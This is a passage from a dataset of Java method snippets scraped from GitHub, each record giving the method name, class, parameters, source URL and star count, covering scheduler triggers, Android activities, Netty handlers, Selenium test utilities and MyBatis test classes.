updateNextCheckTime();\n    logger.info(\"Done resetting checkers. The next check time will be \"\n        + new DateTime(this.nextCheckTime));\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/Condition.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56284, "method_name": "getExpression", "class_name": "Condition", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getExpression() {\n    return this.expression.getExpression();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/Condition.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56285, "method_name": "setExpression", "class_name": "Condition", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setExpression(final String expr) {\n    this.expression = jexl.createExpression(expr);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/Condition.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56286, "method_name": "isMet", "class_name": "Condition", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isMet() {\n    if (logger.isDebugEnabled()) {\n      logger.debug(\"Testing condition \" + this.expression);\n    }\n    return this.expression.evaluate(this.context).equals(Boolean.TRUE);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/Condition.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56287, "method_name": "toJson", "class_name": "Condition", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object toJson() {\n    final Map<String, Object> jsonObj = new HashMap<>();\n    jsonObj.put(\"expression\", this.expression.getExpression());\n\n    final List<Object> checkersJson = new ArrayList<>();\n    for (final ConditionChecker checker : this.checkers.values()) {\n      final Map<String, Object> oneChecker = new HashMap<>();\n      oneChecker.put(\"type\", checker.getType());\n      oneChecker.put(\"checkerJson\", checker.toJson());\n      checkersJson.add(oneChecker);\n    }\n    jsonObj.put(\"checkers\", checkersJson);\n    jsonObj.put(\"nextCheckTime\", String.valueOf(this.nextCheckTime));\n\n    return jsonObj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/trigger/Condition.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56288, "method_name": "run", "class_name": "Lockmpl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {\n        //\u4f7f\u7528\u6b7b\u5faa\u73af\uff0c\u8ba9\u5356\u7968\u91cd\u590d\u6267\u884c\n        while (true) {\n            //2\u3001\u5728\u53ef\u80fd\u51fa\u73b0\u5b89\u5168\u95ee\u9898\u7684\u4ee3\u7801\u524d\u8c03\u7528Lock\u63a5\u53e3\u4e2d\u7684lock\u83b7\u53d6\u9501\n            l.lock();\n\n            //\u5148\u5224\u65ad\u7968\u662f\u5426\u5b58\u5728\n            if(ticket > 0){\n                try {\n                    Thread.sleep(10);\n\n                    System.out.println(Thread.currentThread().getName() + \"-->\u6b63\u5728\u5356\u7b2c\" + ticket + \"\u5f20\u7968\");\n                    ticket--;\n                } catch (InterruptedException e){\n                    e.printStackTrace();\n                }finally {\n                    //3\u3001\u5728\u53ef\u80fd\u51fa\u73b0\u5b89\u5168\u95ee\u9898\u7684\u4ee3\u7801\u540e\u8c03\u7528Lock\u63a5\u53e3\u4e2d\u7684unlock\u91ca\u653e\u9501\n                    l.unlock();\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/java2/Lock/Lockmpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 56289, "method_name": "isExposedNotificationShown", "class_name": "PreferencesUtil", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean isExposedNotificationShown(Context context) {\n\t\tSharedPreferences prefs = context.getSharedPreferences(PREFS_DP3T_SDK_SAMPLE, Context.MODE_PRIVATE);\n\t\treturn prefs.getBoolean(PREF_KEY_EXPOSED_NOTIFICATION, false);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/calibration-app/app/src/main/java/org/dpppt/android/calibration/util/PreferencesUtil.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56290, "method_name": "setExposedNotificationShown", "class_name": "PreferencesUtil", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void setExposedNotificationShown(Context context) {\n\t\tSharedPreferences prefs = context.getSharedPreferences(PREFS_DP3T_SDK_SAMPLE, Context.MODE_PRIVATE);\n\t\tprefs.edit().putBoolean(PREF_KEY_EXPOSED_NOTIFICATION, true).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/calibration-app/app/src/main/java/org/dpppt/android/calibration/util/PreferencesUtil.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56291, "method_name": "onCreate", "class_name": "TermsActivity", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {\n\n        MobileButterApplication.getAppContext()\n                .getComponent()\n                .inject(this);\n        super.onCreate(savedInstanceState, R.layout.activity_terms);\n        setSupportActionBar(toolbar);\n\n        ToolbarUtils.updateToolbarHeight(this, toolbar);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TermsActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": null, "modifiers": ["public"]}}, {"id": 56292, "method_name": "acceptClick", "class_name": "TermsActivity", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void acceptClick(View v) {\n        PrefUtils.save(this, TERMS_ACCEPTED, true);\n        Intent overviewIntent = new Intent(this, MainActivity.class);\n        startActivity(overviewIntent);\n        finish();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TermsActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": null, "modifiers": ["public"]}}, {"id": 56293, "method_name": "leaveClick", "class_name": "TermsActivity", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void leaveClick(View v) {\n        finish();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TermsActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": null, "modifiers": ["public"]}}, {"id": 56294, "method_name": "channelActive", "class_name": "NettyTcpHandler", "params": ["ChannelHandlerContext"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void channelActive(ChannelHandlerContext ctx) throws Exception {\n        super.channelActive(ctx);\n        log.debug(\"{} active\", NettyUtil.getChannelName(ctx.channel()));\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/tcp/NettyTcpHandler.java", "stars": "6", "class_props": {"extends": "SimpleChannelInboundHandler", "implements": null, "modifiers": ["public"]}}, {"id": 56295, "method_name": "exceptionCaught", "class_name": "NettyTcpHandler", "params": ["ChannelHandlerContext", "Throwable"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n        log.error(\"{}\", NettyUtil.getChannelName(ctx.channel()), cause);\n        ctx.close();\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/tcp/NettyTcpHandler.java", "stars": "6", "class_props": {"extends": "SimpleChannelInboundHandler", "implements": null, "modifiers": ["public"]}}, {"id": 56296, "method_name": "channelRead0", "class_name": "NettyTcpHandler", "params": ["ChannelHandlerContext", "ProtocolBody"], "throws": ["Exception"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void channelRead0(ChannelHandlerContext channelHandlerContext, ProtocolBody basePackage) throws Exception {\n        PackageHandler<? extends ProtocolBody> handler = PackageHandlerProcessor.getHandler(basePackage.getClass());\n        AbstractProtocolBody abp = (AbstractProtocolBody) basePackage;\n        Channel channel = channelHandlerContext.channel();\n        log.debug(\"{}{}-{}\", NettyUtil.getChannelName(channel), abp.getPackTypeHexStr(), abp.getPackTypeDesc());\n        handler.process0(basePackage);\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/tcp/NettyTcpHandler.java", "stars": "6", "class_props": {"extends": "SimpleChannelInboundHandler", "implements": null, "modifiers": ["public"]}}, {"id": 56297, "method_name": "channelInactive", "class_name": "NettyTcpHandler", "params": ["ChannelHandlerContext"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void channelInactive(ChannelHandlerContext ctx) throws Exception {\n        super.channelInactive(ctx);\n        Channel channel = ctx.channel();\n        log.debug(\"{} inactive\", NettyUtil.getChannelName(channel));\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/tcp/NettyTcpHandler.java", "stars": "6", "class_props": {"extends": "SimpleChannelInboundHandler", "implements": null, "modifiers": ["public"]}}, {"id": 56298, "method_name": "onSubscribe", "class_name": "SimpleConsumer", "params": ["Disposable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSubscribe(Disposable d) {\n    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/rx/SimpleConsumer.java", "stars": "1", "class_props": {"extends": null, "implements": ["Observer"], "modifiers": ["public", "abstract"]}}, {"id": 56299, "method_name": "onNext", "class_name": "SimpleConsumer", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onNext(T it) {\n        accept(it);\n    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/rx/SimpleConsumer.java", "stars": "1", "class_props": {"extends": null, "implements": ["Observer"], "modifiers": ["public", "abstract"]}}, {"id": 56300, "method_name": "onError", "class_name": "SimpleConsumer", "params": ["Throwable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onError(Throwable e) {\n    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/rx/SimpleConsumer.java", "stars": "1", "class_props": {"extends": null, "implements": ["Observer"], "modifiers": ["public", "abstract"]}}, {"id": 56301, "method_name": "onComplete", "class_name": "SimpleConsumer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onComplete() {\n    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/rx/SimpleConsumer.java", "stars": "1", "class_props": {"extends": null, "implements": ["Observer"], "modifiers": ["public", "abstract"]}}, {"id": 56302, "method_name": "accept", "class_name": "SimpleConsumer", "params": ["T"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void accept(T it);\n}\n", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/rx/SimpleConsumer.java", "stars": "1", "class_props": {"extends": null, "implements": ["Observer"], "modifiers": ["public", "abstract"]}}, {"id": 56303, "method_name": "deploy", "class_name": "VideoApprover", "params": ["Course"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void deploy(Course course) {\n        if(course.getVideo() != null && !\"\".equals(course.getVideo())){\n            System.out.println(course.getName() + \"\u542b\u6709\u89c6\u9891\uff0c\u89c6\u9891\u5ba1\u6838OK\");\n            if(approver != null){\n                approver.deploy(course);\n            }\n        }else{\n            System.out.println(course.getName() + \"\u4e0d\u542b\u6709\u89c6\u9891\uff0c\u89c6\u9891\u5ba1\u6838\u4e0d\u901a\u8fc7\");\n            return;\n        }\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/chainofresponsibility/VideoApprover.java", "stars": "2", "class_props": {"extends": "Approver", "implements": null, "modifiers": ["public"]}}, {"id": 56304, "method_name": "testGetPosition_first_character", "class_name": "DocumentPositionCalculatorTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testGetPosition_first_character() {\n        Position position = sut.getPosition(0);\n\n        Assertions.assertEquals(new Position(0, 0), position);\n    }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/test/java/org/bsplines/languagetool_languageserver/DocumentPositionCalculatorTest.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56305, "method_name": "testGetPosition_starts_with_newline", "class_name": "DocumentPositionCalculatorTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testGetPosition_starts_with_newline() {\n        Position position = new DocumentPositionCalculator(\"\\nHi\").getPosition(1);\n\n        Assertions.assertEquals(new Position(1, 0), position);\n    }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/test/java/org/bsplines/languagetool_languageserver/DocumentPositionCalculatorTest.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56306, "method_name": "testGetPosition_second_line_start", "class_name": "DocumentPositionCalculatorTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testGetPosition_second_line_start() {\n        Position position = sut.getPosition(6);\n\n        Assertions.assertEquals(new Position(1, 0), position);\n    }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/test/java/org/bsplines/languagetool_languageserver/DocumentPositionCalculatorTest.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56307, "method_name": "testGetPosition_second_line_second_character", "class_name": "DocumentPositionCalculatorTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testGetPosition_second_line_second_character() {\n        Position position = sut.getPosition(7);\n\n        Assertions.assertEquals(new Position(1, 1), position);\n    }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/test/java/org/bsplines/languagetool_languageserver/DocumentPositionCalculatorTest.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56308, "method_name": "testGetPosition_arbitrary_position", "class_name": "DocumentPositionCalculatorTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testGetPosition_arbitrary_position() {\n        Position position = sut.getPosition(12);\n\n        Assertions.assertEquals(new Position(1, 6), position);\n    }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/test/java/org/bsplines/languagetool_languageserver/DocumentPositionCalculatorTest.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56309, "method_name": "wait", "class_name": "BrowserUtilities", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void wait(int seconds) {\n        try {\n            Thread.sleep(1000 * seconds);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/CybertekSchool/Fall2019OnlineCucumberSelenium/master/src/test/java/com/vytrack/utilities/BrowserUtilities.java", "stars": "26", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56310, "method_name": "getTextFromWebElements", "class_name": "BrowserUtilities", "params": ["List<WebElement>"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<String>", "snippet": "    public static List<String> getTextFromWebElements(List<WebElement> elements) {\n        List<String> textValues = new ArrayList<>();\n        for (WebElement element : elements) {\n            if (!element.getText().isEmpty()) {\n                textValues.add(element.getText());\n            }\n        }\n        return textValues;\n    }", "url": "https://raw.githubusercontent.com/CybertekSchool/Fall2019OnlineCucumberSelenium/master/src/test/java/com/vytrack/utilities/BrowserUtilities.java", "stars": "26", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56311, "method_name": "waitForPageToLoad", "class_name": "BrowserUtilities", "params": ["long"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void waitForPageToLoad(long timeOutInSeconds) {\n        ExpectedCondition<Boolean> expectation = driver -> ((JavascriptExecutor) driver).executeScript(\"return document.readyState\").equals(\"complete\");\n        try {\n            WebDriverWait wait = new WebDriverWait(Driver.getDriver(), timeOutInSeconds);\n            wait.until(expectation);\n        } catch (Throwable error) {\n            error.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/CybertekSchool/Fall2019OnlineCucumberSelenium/master/src/test/java/com/vytrack/utilities/BrowserUtilities.java", "stars": "26", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56312, "method_name": "clickWithJS", "class_name": "BrowserUtilities", "params": ["WebElement"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void clickWithJS(WebElement element) {\n        ((JavascriptExecutor) Driver.getDriver()).executeScript(\"arguments[0].scrollIntoView(true);\", element);\n        ((JavascriptExecutor) Driver.getDriver()).executeScript(\"arguments[0].click();\", element);\n    }", "url": "https://raw.githubusercontent.com/CybertekSchool/Fall2019OnlineCucumberSelenium/master/src/test/java/com/vytrack/utilities/BrowserUtilities.java", "stars": "26", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56313, "method_name": "scrollTo", "class_name": "BrowserUtilities", "params": ["WebElement"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void scrollTo(WebElement element) {\n        ((JavascriptExecutor) Driver.getDriver()).executeScript(\"arguments[0].scrollIntoView(true);\", element);\n    }", "url": "https://raw.githubusercontent.com/CybertekSchool/Fall2019OnlineCucumberSelenium/master/src/test/java/com/vytrack/utilities/BrowserUtilities.java", "stars": "26", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56314, "method_name": "getScreenshot", "class_name": "BrowserUtilities", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getScreenshot(String name) {\n        //adding date and time to screenshot name, to make screenshot unique\n        name = new Date().toString().replace(\" \", \"_\").replace(\":\", \"-\") + \"_\" + name;\n        //where we gonna store a screenshot\n        String path = \"\";\n\n        if (System.getProperty(\"os.name\").toLowerCase().contains(\"mac\")) {\n            path = System.getProperty(\"user.dir\") + \"/test-output/screenshots/\" + name + \".png\";\n        } else {\n            path = System.getProperty(\"user.dir\") + \"\\\\test-output\\\\screenshots\\\\\" + name + \".png\";\n        }\n\n        System.out.println(\"OS name: \" + System.getProperty(\"os.name\"));\n        System.out.println(\"Screenshot is here: \" + path);\n        //since our reference type is a WebDriver\n        //we cannot see methods from TakesScreenshot interface\n        //that's why do casting\n        TakesScreenshot takesScreenshot = (TakesScreenshot) Driver.getDriver();\n        //take screenshot of web browser, and save it as a file\n        File source = takesScreenshot.getScreenshotAs(OutputType.FILE);\n        //where screenshot will be saved\n        File destination = new File(path);\n        try {\n            //copy file to the previously specified location\n            FileUtils.copyFile(source, destination);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return path;\n    }", "url": "https://raw.githubusercontent.com/CybertekSchool/Fall2019OnlineCucumberSelenium/master/src/test/java/com/vytrack/utilities/BrowserUtilities.java", "stars": "26", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56315, "method_name": "scitchWindow", "class_name": "BrowserUtilities", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void scitchWindow(String title){\n        Set<String> windowHandles = Driver.getDriver().getWindowHandles();\n        for(String window : windowHandles){\n            Driver.getDriver().switchTo().window(window);\n            if(Driver.getDriver().getTitle().equals(title)){\n                break;\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/CybertekSchool/Fall2019OnlineCucumberSelenium/master/src/test/java/com/vytrack/utilities/BrowserUtilities.java", "stars": "26", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56316, "method_name": "onCreateView", "class_name": "MyListFragment", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "\t  public View onCreateView(LayoutInflater inflater, ViewGroup container,\n\t      Bundle savedInstanceState) {\n\t    View view = inflater.inflate(R.layout.fragment_rsslist_overview,\n\t        container, false);\n\t    Button button = (Button) view.findViewById(R.id.button1);\n\t    button.setOnClickListener(new View.OnClickListener() {\n\t      @Override\n\t      public void onClick(View v) {\n\t        updateDetail();\n\t      }\n\t    });\n\t    return view;\n\t  }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/HBfragment/src/com/example/hbfragment/MyListFragment.java", "stars": "74", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 56317, "method_name": "onAttach", "class_name": "MyListFragment", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t    public void onAttach(Activity activity) {\n\t      super.onAttach(activity);\n\t      if (activity instanceof OnItemSelectedListener) {\n\t        listener = (OnItemSelectedListener) activity;\n\t      } else {\n\t        throw new ClassCastException(activity.toString()\n\t            + \" must implemenet MyListFragment.OnItemSelectedListener\");\n\t      }\n\t    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/HBfragment/src/com/example/hbfragment/MyListFragment.java", "stars": "74", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 56318, "method_name": "updateDetail", "class_name": "MyListFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t  public void updateDetail() {\n\t    // Create fake data\n\t    //String newTime = String.valueOf(System.currentTimeMillis());\n\t  String newTime=getString(R.string.hi);\n\t\t  // Send data to Activity\n\t    listener.onRssItemSelected(newTime);\n\t  }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/HBfragment/src/com/example/hbfragment/MyListFragment.java", "stars": "74", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 56319, "method_name": "getUrl", "class_name": "SwitchVideoModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUrl() {\n        return url;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/model/SwitchVideoModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56320, "method_name": "setUrl", "class_name": "SwitchVideoModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUrl(String url) {\n        this.url = url;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/model/SwitchVideoModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56321, "method_name": "getName", "class_name": "SwitchVideoModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/model/SwitchVideoModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56322, "method_name": "setName", "class_name": "SwitchVideoModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = name;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/model/SwitchVideoModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56323, "method_name": "toString", "class_name": "SwitchVideoModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return this.name;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/model/SwitchVideoModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56324, "method_name": "getId", "class_name": "ImmutableAuthor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getId() {\n    return id;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/blog/ImmutableAuthor.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 56325, "method_name": "getUsername", "class_name": "ImmutableAuthor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getUsername() {\n    return username;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/blog/ImmutableAuthor.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 56326, "method_name": "getPassword", "class_name": "ImmutableAuthor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getPassword() {\n    return password;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/blog/ImmutableAuthor.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 56327, "method_name": "getEmail", "class_name": "ImmutableAuthor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getEmail() {\n    return email;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/blog/ImmutableAuthor.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 56328, "method_name": "getBio", "class_name": "ImmutableAuthor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getBio() {\n    return bio;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/blog/ImmutableAuthor.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 56329, "method_name": "getFavouriteSection", "class_name": "ImmutableAuthor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Section", "snippet": "  public Section getFavouriteSection() {\n    return favouriteSection;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/blog/ImmutableAuthor.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 56330, "method_name": "equals", "class_name": "ImmutableAuthor", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean equals(Object o) {\n    if (this == o) return true;\n    if (!(o instanceof Author)) return false;\n\n    Author author = (Author) o;\n\n    if (id != author.id) return false;\n    if (bio != null ? !bio.equals(author.bio) : author.bio != null) return false;\n    if (email != null ? !email.equals(author.email) : author.email != null) return false;\n    if (password != null ? !password.equals(author.password) : author.password != null) return false;\n    if (username != null ? !username.equals(author.username) : author.username != null) return false;\n    if (favouriteSection != null ? !favouriteSection.equals(author.favouriteSection) : author.favouriteSection != null)\n      return false;\n\n    return true;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/blog/ImmutableAuthor.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 56331, "method_name": "hashCode", "class_name": "ImmutableAuthor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int hashCode() {\n    int result;\n    result = id;\n    result = 31 * result + (username != null ? username.hashCode() : 0);\n    result = 31 * result + (password != null ? password.hashCode() : 0);\n    result = 31 * result + (email != null ? email.hashCode() : 0);\n    result = 31 * result + (bio != null ? bio.hashCode() : 0);\n    result = 31 * result + (favouriteSection != null ? favouriteSection.hashCode() : 0);\n    return result;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/blog/ImmutableAuthor.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 56332, "method_name": "toString", "class_name": "ImmutableAuthor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String toString() {\n    return id + \" \" + username + \" \" + password + \" \" + email;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/blog/ImmutableAuthor.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 56333, "method_name": "create", "class_name": "CustomObjectFactory", "params": ["Class<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public <T> T create(Class<T> type) {\n        return create(type, null, null);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/custom_collection_handling/CustomObjectFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectFactory"], "modifiers": ["public"]}}, {"id": 56334, "method_name": "create", "class_name": "CustomObjectFactory", "params": ["Class<T>", "List<Class>", "List<Object>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public <T> T create(Class<T> type, List<Class<?>> constructorArgTypes, List<Object> constructorArgs) {\n        Class<?> 